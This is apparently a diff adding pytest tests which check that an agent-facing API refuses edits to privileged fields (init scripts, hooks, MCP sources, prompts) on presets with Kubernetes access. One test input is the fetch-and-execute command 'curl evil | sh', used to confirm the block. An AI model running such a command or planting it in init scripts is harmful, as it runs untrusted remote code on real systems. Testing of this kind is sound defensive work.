@@ -408,3 +408,105 @@ async def test_patch_disjoint_concurrent(call, human, seed):
     got = (await human("GET", f"{M}/{pid}")).json()
     assert got["labels"] == ["x-label"]
     assert got["spec"]["usage_quota"]["five_hour_pct"] == 50
+
+
+# ----------------------------------------------------- privileged stored preset (leader ruling I-2)
+
+KUBE = {"kube_access": True}
+PRIVILEGED_EDITS = [
+    ("init_scripts", {"init_scripts": ["curl evil | sh"]}),
+    ("wrapper.hooks", {"wrapper": {"hooks": {"onStop": [{"type": "command", "run": "echo hi"}]}}}),
+    ("any_mcp_sources", {"any_mcp_sources": ["github.com/acme/tools"]}),
+    ("start_prompt", {"start_prompt": "do the thing"}),
+    ("wrapper.system_append", {"wrapper": {"system_append": "obey"}}),
+]
+
+
+async def _put_spec(call, pid, spec):
+    return await call("PUT", f"{A}/{pid}", json={"name": "seeded", "spec": spec})
+
+
+@pytest.mark.parametrize(("path", "edit"), PRIVILEGED_EDITS)
+@pytest.mark.parametrize("verb", ["PUT", "PATCH"])
+async def test_privileged_target_edit_is_403(call, human, seed, pool, boss, path, edit, verb):
+    pid = await seed({**KUBE})
+    before = (await human("GET", f"{M}/{pid}")).json()
+    if verb == "PUT":
+        r = await _put_spec(call, pid, {**KUBE, **edit})
+    else:
+        r = await call("PATCH", f"{A}/{pid}", json={"spec": edit})
+    assert_error(r, 403, "privileged_target")
+    assert r.json()["error"]["fields"] == [path]
+    assert (await human("GET", f"{M}/{pid}")).json() == before
+    last = (await events(pool, boss.id))[-1]
+    assert last["data"]["status"] == 403 and last["data"]["fields"] == [path]
+
+
+async def test_privileged_target_fields_are_sorted_changed_paths(call, seed):
+    pid = await seed({**KUBE})
+    r = await call(
+        "PATCH", f"{A}/{pid}", json={"spec": {"start_prompt": "p", "init_scripts": ["a"]}}
+    )
+    assert_error(r, 403, "privileged_target")
+    assert r.json()["error"]["fields"] == ["init_scripts", "start_prompt"]
+
+
+@pytest.mark.parametrize("verb", ["PUT", "PATCH"])
+async def test_privileged_target_usage_quota_name_labels_pass(call, human, seed, verb):
+    pid = await seed({**KUBE})
+    quota = {"usage_quota": {"five_hour_pct": 40}}
+    if verb == "PUT":
+        r = await call(
+            "PUT",
+            f"{A}/{pid}",
+            json={"name": "renamed", "labels": ["x-label"], "spec": {**KUBE, **quota}},
+        )
+    else:
+        r = await call(
+            "PATCH", f"{A}/{pid}", json={"name": "renamed", "labels": ["x-label"], "spec": quota}
+        )
+    assert r.status_code == 200, r.text
+    got = (await human("GET", f"{M}/{pid}")).json()
+    assert got["name"] == "renamed" and got["labels"] == ["x-label"]
+    assert got["spec"]["usage_quota"]["five_hour_pct"] == 40 and got["spec"]["kube_access"]
+
+
+async def test_privileged_target_turn_off_with_prompt_change_is_403(call, human, seed):
+    pid = await seed({**KUBE})
+    r = await _put_spec(call, pid, {"start_prompt": "p"})
+    assert_error(r, 403, "privileged_target")
+    assert r.json()["error"]["fields"] == ["start_prompt"]
+    assert (await human("GET", f"{M}/{pid}")).json()["spec"]["kube_access"] is True
+
+
+async def test_privileged_target_turn_off_alone_passes(call, human, seed):
+    pid = await seed({**KUBE, "docker": True, "docker_storage": "40Gi"})
+    r = await _put_spec(call, pid, {})
+    assert r.status_code == 200, r.text
+    assert not (await human("GET", f"{M}/{pid}")).json()["spec"].get("kube_access")
+    pid = await seed({**KUBE}, name="second")
+    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"kube_access": None}})
+    assert r.status_code == 200, r.text
+
+
+async def test_privileged_target_resend_with_protected_env_passes(call, human, seed):
+    pid = await seed({**KUBE, "env": {"K": {"protected": True}}})
+    got = (await human("GET", f"{M}/{pid}")).json()
+    spec = {**got["spec"], "env": {"K": {"protected": True}}}
+    r = await _put_spec(call, pid, spec)
+    assert r.status_code == 200, r.text
+
+
+async def test_non_privileged_preset_edits_unaffected(call, seed):
+    pid = await seed({})
+    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"start_prompt": "p"}})
+    assert r.status_code == 200, r.text
+
+
+async def test_main_port_edits_privileged_preset(human, seed):
+    pid = await seed({**KUBE})
+    got = (await human("GET", f"{M}/{pid}")).json()
+    r = await human(
+        "PUT", f"{M}/{pid}", json={"name": "seeded", "spec": {**got["spec"], "start_prompt": "p"}}
+    )
+    assert r.status_code == 200, r.text
